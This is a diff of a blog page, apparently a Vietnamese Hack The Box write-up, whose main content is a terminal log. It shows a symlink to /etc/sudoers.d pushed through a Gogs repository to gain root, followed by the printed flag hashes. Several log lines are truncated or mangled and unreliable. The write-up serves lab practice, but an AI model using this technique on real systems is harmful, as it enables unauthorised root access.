+<p>ben@silentium:~$ cd &#x2F;tmp<br>&lt;rên Gogs về (thay username của bạn vào)<br>&lt;.0.0.1:3001&#x2F;&lt;USERNAME_CỦA_BẠN&gt;&#x2F;poc-root.git<br>-bash: USERNAME_CỦA_BẠN: No such file or directory<br>ben@silentium:&#x2F;tmp$ cd poc-root<br>-bash: cd: poc-root: No such file or directory<br>ben@silentium:&#x2F;tmp$<br>&lt;� thẳng tới file cấu hình sudo của Ben<br>ben@silentium:&#x2F;tmp$ ln -s &#x2F;etc&#x2F;sudoers.d&#x2F;ben payload<br>ben@silentium:&#x2F;tmp$<br>ben@silentium:&#x2F;tmp$ # Commit và Push file symlink này lên Gogs<br>ben@silentium:&#x2F;tmp$ git add payload<br>fatal: not a git repository (or any of the parent directories): .git<br>ben@silentium:&#x2F;tmp$ git commit -m “add symlink”<br>fatal: not a git repository (or any of the parent directories): .git<br>ben@silentium:&#x2F;tmp$ git push origin master<br>fatal: not a git repository (or any of the parent directories): .git<br>&lt;one <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:3001/phong123/poc-root.git" >http://127.0.0.1:3001/phong123/poc-root.git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>                          Cloning into ‘poc-root’…<br>warning: You appear to have cloned an empty repository.<br>ben@silentium:&#x2F;tmp$ git clone <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:3001/phong123/poc-root.git" >http://127.0.0.1:3001/phong123/poc-root.git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>fatal: destination path ‘poc-root’ already exists and is not an empty directory.<br>ben@silentium:&#x2F;tmp$ rm -rf poc-root<br>ben@silentium:&#x2F;tmp$ git clone <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:3001/phong123/poc-root.git" >http://127.0.0.1:3001/phong123/poc-root.git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Cloning into ‘poc-root’…<br>warning: You appear to have cloned an empty repository.<br>ben@silentium:&#x2F;tmp$ cd poc-root&#x2F;<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ ln -s &#x2F;etc&#x2F;sudoers.d&#x2F;ben payload<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ git config user.email “<a class="link"   href="mailto:&#98;&#101;&#110;&#x31;&#50;&#x33;&#x40;&#x73;&#x69;&#x6c;&#x65;&#x6e;&#x74;&#x69;&#x75;&#x6d;&#x2e;&#104;&#116;&#98;" >ben123@silentium.htb<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ git config user.name “phong123”<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ git add payload<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ git commit -m “add symlink payload”<br>[master (root-commit) a8a2fa3] add symlink payload<br> 1 file changed, 1 insertion(+)<br> create mode 120000 payload<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ git push origin master<br>Enumerating objects: 3, done.<br>Counting objects: 100% (3&#x2F;3), done.<br>Writing objects: 100% (3&#x2F;3), 232 bytes | 232.00 KiB&#x2F;s, done.<br>Total 3 (delta 0), reused 0 (delta 0), pack-reused 0<br>Username for ‘<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:3001/" >http://127.0.0.1:3001<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>‘: phong123<br>Password for ‘<a class="link"   target="_blank" rel="noopener" href="http://phong123@127.0.0.1:3001/" >http://phong123@127.0.0.1:3001<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>‘:<br>To <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:3001/phong123/poc-root.git" >http://127.0.0.1:3001/phong123/poc-root.git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<ul>
+<li>[new branch]      master -&gt; master<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ sudo su<br>&#x2F;etc&#x2F;sudoers.d&#x2F;ben:1:28: syntax error<br>ben ALL&#x3D;(ALL) NOPASSWL: ALL<br>                    ^</li>
+</ul>
+<p>[sudo] password for ben:<br>sudo: a password is required<br>ben@silentium:&#x2F;tmp&#x2F;poc-root$ sudo su<br>root@silentium:&#x2F;tmp&#x2F;poc-root# cat &#x2F;r<br>root&#x2F; run&#x2F;<br>root@silentium:&#x2F;tmp&#x2F;poc-root# cat &#x2F;root&#x2F;root.txt<br>4669b61f2901c89e87aa9e779c7b840d</p>
+<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>e33a083f22f1294d682760ea64f1e887</p>
+<p>4669b61f2901c89e87aa9e779c7b840d</p>
 
 		</div>
 
@@ -792,7 +788,7 @@
 			</li>
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/Web/">#Web</a>&nbsp;
+				<a href="/tags/Machine/">#Machine</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -804,12 +800,12 @@
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
 			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2026/04/16/HTB-DoxPit/">
+				<a class="prev" rel="prev" href="/2026/04/30/HTB/Machine-Interpreter/">
 					<span class="left arrow-icon flex justify-center items-center">
 						<i class="fa-solid fa-chevron-left"></i>
 					</span>
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">[HTB] DoxPit</span>
+						<span class="post-nav-title-item truncate max-w-48">[HTB] Interpreter</span>
 						<span class="post-nav-item">Prev posts</span>
 					</span>
 				</a>
@@ -817,9 +813,9 @@
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2026/04/13/NextPath/">
+				<a class="next" rel="next" href="/2026/04/28/HTB/TwoMillion/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">[HTB] NextPath</span>
+						<span class="post-nav-title-item truncate max-w-48">[HTB] TwoMillion</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -840,8 +836,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">[HTB] Interstellar</div>
-		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Gioi-thieu"><span class="nav-text">Giới thiệu:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phan-tich"><span class="nav-text">Phân tích</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Khai-Thac"><span class="nav-text">Khai Thác</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tong-ket"><span class="nav-text">Tổng kết</span></a></li></ol>
+		<div class="page-title">[HTB] Silentium</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Gioi-thieu"><span class="nav-text">Giới thiệu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reconnaissance-Enumeration"><span class="nav-text">Reconnaissance &amp; Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vhost-fuzzing"><span class="nav-text">Vhost fuzzing</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#User-Flag"><span class="nav-text">User Flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE"><span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li></ol>
 
 	</div>
 </div>
